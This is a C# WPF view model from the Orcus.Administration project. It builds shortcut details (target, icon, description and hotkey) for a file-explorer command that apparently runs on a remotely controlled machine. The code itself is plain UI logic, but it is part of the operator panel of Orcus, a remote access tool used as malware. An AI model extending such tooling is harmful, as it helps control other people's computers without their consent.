using System;
using System.IO;
using System.Windows.Input;
using MahApps.Metro.Controls;
using Orcus.Administration.Core.Native;
using Orcus.Shared.Commands.FileExplorer;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels.FileExplorer
{
    public class CreateShortcutViewModel : PropertyChangedBase
    {
        private const byte HOTKEYF_SHIFT = 0x01;
        private const byte HOTKEYF_CONTROL = 0x02;
        private const byte HOTKEYF_ALT = 0x04;

        private RelayCommand _createShortcutCommand;
        private string _description;

        private bool? _dialogResult;
        private HotKey _hotKey;
        private int _iconIndex = 1;
        private string _iconPath;
        private string _name;
        private string _pathParentDirectory;
        private string _targetLocation;
        private string _workingDirectory;

        public string Name
        {
            get { return _name; }
            set { SetProperty(value, ref _name); }
        }

        public string TargetLocation
        {
            get { return _targetLocation; }
            set
            {
                if (SetProperty(value, ref _targetLocation))
                    try
                    {
                        PathParentDirectory = Path.GetDirectoryName(value);
                    }
                    catch (Exception)
                    {
                        PathParentDirectory = string.Empty;
                    }
            }
        }

        public string WorkingDirectory
        {
            get { return _workingDirectory; }
            set { SetProperty(value, ref _workingDirectory); }
        }

        public string Description
        {
            get { return _description; }
            set { SetProperty(value, ref _description); }
        }

        public string PathParentDirectory
        {
            get { return _pathParentDirectory; }
            set { SetProperty(value, ref _pathParentDirectory); }
        }

        public string IconPath
        {
            get { return _iconPath; }
            set { SetProperty(value, ref _iconPath); }
        }

        public int IconIndex
        {
            get { return _iconIndex; }
            set { SetProperty(value, ref _iconIndex); }
        }

        public HotKey HotKey
        {
            get { return _hotKey; }
            set { SetProperty(value, ref _hotKey); }
        }

        public bool? DialogResult
        {
            get { return _dialogResult; }
            set { SetProperty(value, ref _dialogResult); }
        }

        public ShortcutInfo ShortcutInfo { get; private set; }
        public string Filename { get; private set; }

        public RelayCommand CreateShortcutCommand
        {
            get
            {
                return _createShortcutCommand ?? (_createShortcutCommand = new RelayCommand(parameter =>
                {
                    Filename = Name;
                    if (!Filename.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase))
                        Filename = Filename + ".lnk";

                    ShortcutInfo = new ShortcutInfo
                    {
                        TargetLocation = TargetLocation,
                        Description = Description,
                        WorkingDirectory = WorkingDirectory,
                        IconPath = IconPath,
                        IconIndex = IconIndex
                    };
                    if (HotKey != null)
                    {
                        var low = (byte) KeyInterop.VirtualKeyFromKey(HotKey.Key);
                        byte high = 0;

                        if ((HotKey.ModifierKeys & ModifierKeys.Alt) != ModifierKeys.None)
                            high = (byte) (high | HOTKEYF_ALT);

                        if ((HotKey.ModifierKeys & ModifierKeys.Shift) != ModifierKeys.None)
                            high = (byte) (high | HOTKEYF_SHIFT);

                        if ((HotKey.ModifierKeys & ModifierKeys.Control) != ModifierKeys.None)
                            high = (byte) (high | HOTKEYF_CONTROL);

                        ShortcutInfo.Hotkey = (short) ValueHelper.MakeWord(low, high);
                    }

                    DialogResult = true;
                }));
            }
        }
    }
}